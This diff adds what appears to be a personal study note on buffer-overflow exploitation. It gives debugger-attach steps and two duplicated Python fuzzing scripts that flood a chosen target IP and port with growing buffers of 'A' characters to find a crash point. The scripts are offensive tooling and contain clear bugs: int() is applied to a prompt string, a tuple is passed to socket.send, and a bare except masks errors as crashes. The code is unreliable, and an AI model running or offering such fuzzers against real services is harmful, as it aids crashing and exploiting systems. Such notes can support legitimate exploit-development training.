@@ -1,0 +1,81 @@
+##################################
+#####BUFFER###############
+#############OVER-FLOW#####################
+######Fuzzing#################
+
+Run as Admin Immunity Debbuger:
+->File ->Attach ->choose the wanted PID ->click on "play" 
+
+On Kali:
+1)python script for fuzzing:
+    nano fuzz.py:
+
+
+#!/usr/bin/python
+
+import sys, socket
+import re
+from time import sleep
+
+buffer_over_the_rainbow = "A" * 100
+
+try:
+    ip = raw_input("Enter your target here: ")
+except:
+    ip = input("Enter your target here: ")
+
+if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
+    print('Invalid Target IP')
+
+port = input(int("Enter Target Port here: "))
+
+cmd_name = input(str("Enter the wanted cmd to check: "))
+
+while True:
+    try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+
+            s.send((cmd_name,'/.:/' + buffer_over_the_rainbow))
+            s.close()
+            sleep(1)
+            buffer_over_the_rainbow += "A"*100
+    
+    except:
+        print "Fuzzing crashed at %s bytes" % str(len(buffer_over_the_rainbow))
+        sys.exit()
+
+
+#!/usr/bin/python
+
+import sys, socket
+import re
+from time import sleep
+
+buffer_over_the_rainbow = "A" * 100
+
+try:
+    ip = raw_input("Enter your raw target here: ")
+except:
+    ip = input("Enter your target here: ")
+
+if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
+    print('Invalid Target IP')
+
+port = input("Enter Target Port here: ")
+
+cmd_name = input(str("Enter the wanted cmd to check: "))
+
+while True:
+    try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+
+            s.send((cmd_name,'/.:/' + buffer_over_the_rainbow))
+            s.close()
+            sleep(1)
+            buffer_over_the_rainbow += "A"*100
+    
+    except:
+        print ("Fuzzing crashed at %s bytes" % str(len(buffer_over_the_rainbow)))
+        sys.exit()
